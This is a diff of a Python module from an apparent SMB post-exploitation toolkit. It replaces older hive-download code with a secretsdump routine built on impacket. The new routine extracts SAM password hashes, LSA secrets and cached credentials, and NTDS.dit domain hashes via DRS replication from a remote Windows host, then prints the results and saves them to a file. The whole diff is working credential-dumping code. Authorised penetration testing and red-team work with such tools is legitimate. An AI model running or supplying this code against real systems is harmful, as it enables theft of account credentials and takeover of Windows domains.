@@ -1,104 +1,215 @@
-from binascii import hexlify, unhexlify
-from shutil import which
+import os
+import sys
+
 from slingerpkg.utils.printlib import *
-from slingerpkg.lib.hashdump import *
-from slingerpkg.utils.common import run_local_command
 
 
 class secrets:
     def __init__(self):
-        print_debug("WinReg Module Loaded!")
-        self._bootKey = b""
-        self._samKey = b""
-
-    def getBootKey(self):
-        self._bootKey = b""
-        print_debug("Getting BootKey")
-        bootKey = b""
-        self.setup_dce_transport()
-        self.dce_transport._connect("winreg")
-        bootKey = self.dce_transport._get_boot_key()
-        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
-
-        bootKey = unhexlify(bootKey)
-
-        for i in range(len(bootKey)):
-            self._bootKey += bootKey[transforms[i] : transforms[i] + 1]
-
-        print_good("Target system bootKey: 0x%s" % hexlify(self._bootKey).decode("utf-8"))
-
-    def saveHive(self, hiveName):
-        print_debug(f"Saving Hive {hiveName}")
-        self.setup_dce_transport()
-        self.dce_transport._connect("winreg")
-        remoteFileName = self.dce_transport._save_hive(hiveName)
-        if remoteFileName is None:
-            print_bad(f"Failed to save {hiveName} hive")
-            return None, None
-        saveName = "/tmp/" + hiveName + ".hive"
-        if self.share.upper() == "C$":
-            remotePath = f"\\Windows\\Temp\\{remoteFileName}"
-            self.download(remotePath, saveName)
-        elif self.share.upper() == "ADMIN$":
-            remotePath = f"\\Temp\\{remoteFileName}"
-            self.download(remotePath, saveName)
-
-        return remotePath, saveName
+        print_debug("Secrets Module Loaded!")
 
     def secretsdump(self, args):
-        try:
-            if self.share.upper() != "C$" and self.share.upper() != "ADMIN$":
-                print_warning("You need to connect to C$ or ADMIN$ to dump hashes")
-                return
-        except AttributeError:
-            print_warning("You need to connect to C$ or ADMIN$ to dump hashes")
+        """Dump secrets from the remote system using the existing SMB session.
+
+        Uses impacket's RemoteOperations with self.conn — no new connections.
+        Supports SAM hashes, LSA secrets (cached creds, service passwords),
+        and NTDS.dit (domain controllers only via DRS replication).
+        """
+        from impacket.examples.secretsdump import (
+            RemoteOperations,
+            SAMHashes,
+            LSASecrets,
+            NTDSHashes,
+        )
+
+        # Determine what to dump
+        dump_sam = getattr(args, "sam", False)
+        dump_lsa = getattr(args, "lsa", False)
+        dump_ntds = getattr(args, "ntds", False)
+        just_dc_ntlm = getattr(args, "just_dc_ntlm", False)
+        history = getattr(args, "history", False)
+        output_file = getattr(args, "output", None)
+
+        # If --ntds with --just-dc-ntlm, skip SAM/LSA
+        if just_dc_ntlm:
+            dump_ntds = True
+            dump_sam = False
+            dump_lsa = False
+
+        # Default: SAM + LSA
+        if not dump_sam and not dump_lsa and not dump_ntds:
+            dump_sam = True
+            dump_lsa = True
+
+        # Require share connection
+        if not self.check_if_connected():
             return
-        print_info("Dumping secrets...")
-        remotePath_SYSTEM, localPath_SYSTEM = self.saveHive("SYSTEM")
-        self.delete(remotePath_SYSTEM)
-        print_info("Saving SAM Hive")
-        remotePath_SAM, localPath_SAM = self.saveHive("SAM")
-        self.delete(remotePath_SAM)
-        # determine which command is avilable
-        bins = ["secretsdump.py", "secretsdump", "impacket-secretsdump", "impacket-secretsdump.py"]
-        binaryName = None
-        for bin in bins:
-            if which(bin):
-                binaryName = which(bin)
-        if binaryName is None:
-            binaryName = "secretsdump.py"  # local copy
-        print_info(f"Using {os.path.basename(binaryName)} to dump secrets")
-        run_local_command(f"{binaryName} -sam {localPath_SAM} -system {localPath_SYSTEM} LOCAL")
 
-    def hashdump(self, args):
-        hashTable = []
-        share = self.share
+        # Collect output
+        collected_secrets = []
+
+        def secret_callback(*args):
+            """Called for each extracted secret.
+
+            SAM passes (secret,), LSA/NTDS passes (secretType, secret).
+            """
+            secret = args[-1] if args else None
+            if secret is not None:
+                print(secret)
+                collected_secrets.append(str(secret))
+
+        # Use existing SMB connection — no re-auth
+        use_kerberos = getattr(self, "use_kerberos", False)
+        remote_ops = None
+        sam_hashes = None
+        lsa_secrets = None
+        ntds_hashes = None
+
         try:
-            if share.upper() != "C$" and share.upper() != "ADMIN$":
-                print_warning("You need to connect to C$ or ADMIN$ to dump hashes")
-                return
-        except AttributeError:
-            print_warning("You need to connect to C$ or ADMIN$ to dump hashes")
-            return
+            remote_ops = RemoteOperations(self.conn, use_kerberos, kdcHost=None)
 
-        print_info("Dumping hashes...")
-        # self.getBootKey()
-        print_info("Saving SYSTEM Hive")
-        remotePath_SYSTEM, localPath_SYSTEM = self.saveHive("SYSTEM")
-        self.delete(remotePath_SYSTEM)
-        print_info("Saving SAM Hive")
-        remotePath_SAM, localPath_SAM = self.saveHive("SAM")
-        self.delete(remotePath_SAM)
-        sys_key = get_bootkey(localPath_SYSTEM)
-        print(f"BootKey: {sys_key.hex()}")
-        # Initialize registry access function
-        h = RegHive(localPath_SAM)
-        sam_key = get_hbootkey(h, sys_key)
-        print(f"SamKey: {sam_key.hex()}")
+            # Enable registry for SAM/LSA
+            if dump_sam or dump_lsa:
+                print_info("Enabling registry access...")
+                remote_ops.enableRegistry()
+                boot_key = remote_ops.getBootKey()
+                no_lm_hash = remote_ops.checkNoLMHashPolicy()
 
-        # list users and hashes
-        hashTable = get_hashes(h, sam_key)
-        # print(hashTable)
-        # Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e119ec7919cc3b1d7ad859697cfa659:::
-        for user in hashTable:
-            print(f"{user['Username']}:{user['RID']}:{user['LMHash']}:{user['NTHash']}:::")
+            # SAM hashes
+            if dump_sam:
+                print_info("Dumping SAM hashes...")
+                try:
+                    sam_file = remote_ops.saveSAM()
+                    sam_hashes = SAMHashes(
+                        sam_file, boot_key, isRemote=True, perSecretCallback=secret_callback
+                    )
+                    sam_hashes.dump()
+                except Exception as e:
+                    try:
+                        error_str = str(e)
+                    except TypeError:
+                        error_str = repr(e)
+                    print_bad(f"SAM dump failed: {error_str}")
+
+            # LSA secrets
+            if dump_lsa:
+                print_info("Dumping LSA secrets...")
+                try:
+                    security_file = remote_ops.saveSECURITY()
+                    lsa_secrets = LSASecrets(
+                        security_file,
+                        boot_key,
+                        remote_ops,
+                        isRemote=True,
+                        history=history,
+                        perSecretCallback=secret_callback,
+                    )
+                    lsa_secrets.dumpCachedHashes()
+                    lsa_secrets.dumpSecrets()
+                except Exception as e:
+                    try:
+                        error_str = str(e)
+                    except TypeError:
+                        error_str = repr(e)
+                    print_bad(f"LSA secrets dump failed: {error_str}")
+
+            # NTDS.dit (domain controllers only)
+            if dump_ntds:
+                print_info("Dumping NTDS.dit via DRS replication...")
+                try:
+                    # For DRS we need boot key if not already obtained
+                    if not dump_sam and not dump_lsa:
+                        remote_ops.enableRegistry()
+                        boot_key = remote_ops.getBootKey()
+                        no_lm_hash = remote_ops.checkNoLMHashPolicy()
+
+                    # Pre-check: try to connect SAMR to verify DC
+                    try:
+                        domain_name = remote_ops.getMachineNameAndDomain()[1]
+                        print_info(f"Domain: {domain_name}")
+                        remote_ops.connectSamr(domain_name)
+                        print_debug("SAMR connection established — target is a DC")
+                    except Exception as e:
+                        try:
+                            error_str = str(e)
+                        except TypeError:
+                            error_str = repr(e)
+                        print_bad(
+                            f"Cannot connect to SAMR — target may not be a domain controller: {error_str}"
+                        )
+                        return
+
+                    ntds_hashes = NTDSHashes(
+                        None,
+                        boot_key,
+                        isRemote=True,
+                        history=history,
+                        noLMHash=no_lm_hash,
+                        remoteOps=remote_ops,
+                        justNTLM=just_dc_ntlm,
+                        perSecretCallback=secret_callback,
+                    )
+                    ntds_hashes.dump()
+                except Exception as e:
+                    try:
+                        error_str = str(e)
+                    except TypeError:
+                        error_str = repr(e)
+                    if "ERROR_DS_DRA_BAD_DN" in error_str:
+                        print_bad("NTDS dump failed — target may not be a domain controller")
+                    else:
+                        print_bad(f"NTDS dump failed: {error_str}")
+
+            # Summary
+            if collected_secrets:
+                print_good(f"Extracted {len(collected_secrets)} secret(s)")
+
+                # Save to file if requested
+                if output_file:
+                    with open(output_file, "w") as f:
+                        f.write("\n".join(collected_secrets) + "\n")
+                    print_good(f"Secrets saved to {output_file}")
+
+                details = []
+                if dump_sam:
+                    details.append("SAM")
+                if dump_lsa:
+                    details.append("LSA")
+                if dump_ntds:
+                    details.append("NTDS")
+                self._track("EXEC", "secretsdump", self.host, "+".join(details))
+            else:
+                print_warning("No secrets extracted")
+
+        except Exception as e:
+            try:
+                error_str = str(e)
+            except TypeError:
+                error_str = repr(e)
+            print_bad(f"Secretsdump error: {error_str}")
+            print_debug(f"Traceback:", sys.exc_info())
+
+        finally:
+            # Cleanup — restore registry state, delete temp hive files
+            try:
+                if sam_hashes:
+                    sam_hashes.finish()
+            except Exception:
+                pass
+            try:
+                if lsa_secrets:
+                    lsa_secrets.finish()
+            except Exception:
+                pass
+            try:
+                if ntds_hashes:
+                    ntds_hashes.finish()
+            except Exception:
+                pass
+            try:
+                if remote_ops:
+                    remote_ops.finish()
+            except Exception:
+                pass
+            # RemoteOperations sets a 5-min timeout; no reliable way to restore
+            # the original since getTimeout() doesn't exist in all impacket versions
